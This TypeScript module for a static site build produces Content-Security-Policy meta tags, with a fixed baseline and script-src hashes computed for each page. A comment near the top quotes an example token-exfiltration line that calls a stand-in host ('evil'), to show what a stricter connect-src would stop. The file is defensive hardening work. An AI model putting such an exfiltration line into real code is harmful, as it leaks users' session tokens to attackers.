/**
 * Content-Security-Policy meta tag for the static build (bench-review#3
 * hardening — defense-in-depth against the raw `x-html` sinks).
 *
 * Injected into every dist/*.html <head> by build.ts, mirroring the
 * ts-analytics / SEO post-build splice (buildApp()'s SSG ignores
 * config.app.head, so a response header isn't available app-side; a
 * <meta http-equiv> is the app-owned mechanism). Note: `frame-ancestors`,
 * `report-uri`, and report-only are IGNORED in a meta CSP — clickjacking
 * (`frame-ancestors`/X-Frame-Options) must be set at the deploy/CDN layer.
 *
 * ── Why this file ships only the SAFE BASELINE ──────────────────────────
 * The directives below are provably non-breaking for THIS app:
 *   - object-src 'none'  — no <object>/<embed> anywhere (blocks plugin XSS)
 *   - base-uri 'self'    — no <base> tag (blocks <base href> script-hijack)
 *   - form-action 'self' — every form POSTs same-origin (blocks XSS forms
 *                          that auto-submit credentials to an external site)
 *
 * ── The part that actually closes #3 needs a LIVE pass first ────────────
 * A locked `connect-src`/`img-src`/`script-src` is what stops a stolen
 * token from being exfiltrated (`fetch('//evil/?c='+token)` / `<img
 * src=//evil>`), neutralizing the XSS→token-theft chain even though the
 * token stays JS-readable. But those directives are ENV-DEPENDENT and a
 * missed origin SILENTLY blanks maps/avatars/images/analytics on the live
 * site, so they must be verified against a running app before enabling.
 * Enumerated origins (2026-07, from code — CONFIRM before turning on):
 *   img-src     'self' data: https://images.unsplash.com https://www.gravatar.com
 *               https://ui-avatars.com https://*.tile.openstreetmap.org
 *               https://cdn.jsdelivr.net  [+ config/filesystems.ts s3.publicUrl if S3]
 *   script-src  'self' 'unsafe-inline'  [+ ts-analytics origin — TS_ANALYTICS_ENDPOINT,
 *               'http://localhost:2027' in the current dev build]
 *   connect-src 'self'  [+ ts-analytics origin]  (API is same-origin via relative /api)
 *   style-src   'self' 'unsafe-inline'   font-src 'self' data:
 * 'unsafe-inline' on script-src is unavoidable until stx emits nonces/hashes
 * on its inline scripts; even so, the connect/img lock-down blocks exfil.
 */

/** Provably-non-breaking baseline. Extend with the exfil directives above
 *  only after verifying maps/avatars/images/analytics load on a live app. */
const SAFE_BASELINE = [
  'object-src \'none\'',
  'base-uri \'self\'',
  'form-action \'self\'',
].join('; ')

/** The `<meta http-equiv>` string spliced into each page's <head>. */
export function cspMetaTag(policy: string = SAFE_BASELINE): string {
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`
}

/**
 * Every inline <script> body in a page, in document order.
 *
 * Excludes anything with a `src` — those are covered by 'self' — but INCLUDES
 * non-executable types (application/ld+json, stx/island). The browser doesn't
 * run those so CSP doesn't police them, and hashing them costs one token each
 * while removing any judgement call about which types execute.
 */
export function inlineScripts(html: string): string[] {
  return [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>([\s\S]*?)<\/script>/g)].map(m => m[1])
}

/**
 * `script-src` built from the page's own inline scripts.
 *
 * The note above says 'unsafe-inline' is "unavoidable until stx emits
 * nonces/hashes". stx 0.2.176 does now ship a CSP module — but it is
 * NONCE-only, and a nonce cannot work in a pre-rendered file: the value would
 * be baked into the artifact and served identically to everyone, which is
 * 'unsafe-inline' wearing a disguise. Hashes are the mechanism that fits a
 * static build, and nothing requires stx to emit them — the bytes are right
 * there in the built page.
 *
 * Measured before enabling: the built output contains ZERO inline `on*`
 * handlers, so this needs no 'unsafe-hashes' (which CSP requires for attribute
 * handlers and which would substantially weaken the policy). Max 9 inline
 * scripts on any page.
 *
 * Still allows 'self' for the external chunks and island sources, plus the
 * analytics origin, which serves a real <script src>.
 */
export function scriptSrcFor(html: string, analyticsOrigin?: string): string {
  const hashes = inlineScripts(html).map((body) => {
    const digest = new Bun.CryptoHasher('sha256').update(body, 'utf8').digest('base64')
    return `'sha256-${digest}'`
  })
  // 'unsafe-eval' is NOT optional here, and it is worth being clear about why
  // rather than quietly including it: stx's template binder evaluates every
  // directive expression through `new Function` (31 occurrences in the shipped
  // runtime chunk). CSP's eval restriction applies to the executing context,
  // not the script's origin, so a same-origin runtime is still blocked. Without
  // it every binding on every page throws and the app is inert.
  //
  // It buys an attacker much less than 'unsafe-inline' would. With hashes and
  // no 'unsafe-inline', an injected <script> does not run (no matching hash)
  // and an injected on*= handler does not run (no 'unsafe-hashes'), so the
  // injection-to-execution step is still closed. 'unsafe-eval' only matters to
  // code that is already running — with one caveat worth recording: stx
  // evaluates x-/@ attribute expressions found in the DOM, so markup that
  // reaches a raw x-html sink can still be executed through that path. That is
  // the sink sanitizeReviewHtml exists to guard, and it is why this is a
  // meaningful improvement rather than a complete answer.
  const origins = ['\'self\'', ...(analyticsOrigin ? [analyticsOrigin] : []), '\'unsafe-eval\'']
  return `script-src ${[...origins, ...new Set(hashes)].join(' ')}`
}

/**
 * The full per-page policy: the baseline plus a hashed script-src.
 *
 * MUST be computed after every other build pass that can add a script — it
 * hashes what is actually on the page at that moment. build.ts runs the CSP
 * step last for exactly this reason.
 */
export function cspPolicyFor(html: string, analyticsOrigin?: string): string {
  return `${SAFE_BASELINE}; ${scriptSrcFor(html, analyticsOrigin)}`
}
